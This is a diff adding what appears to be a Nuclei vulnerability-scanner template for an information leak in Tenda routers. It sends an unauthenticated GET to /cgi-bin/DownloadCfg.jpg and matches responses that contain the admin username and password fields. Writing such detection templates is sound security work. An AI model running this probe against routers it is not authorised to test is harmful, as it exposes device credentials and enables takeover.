@@ -1,0 +1,33 @@
+id: tenda-router-downloadcfg-info-leak
+
+info:
+  name: Tenda Router DownloadCfg.jpg Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    Tenda routers are vulnerable to an information leakage issue via the DownloadCfg.jpg endpoint, exposing sensitive configuration data.
+
+http:
+  - method: GET
+    path:
+      - "/cgi-bin/DownloadCfg.jpg"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "http_username="
+          - "http_passwd="
+      - type: word
+        part: header
+        words:
+          - "config/conf"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
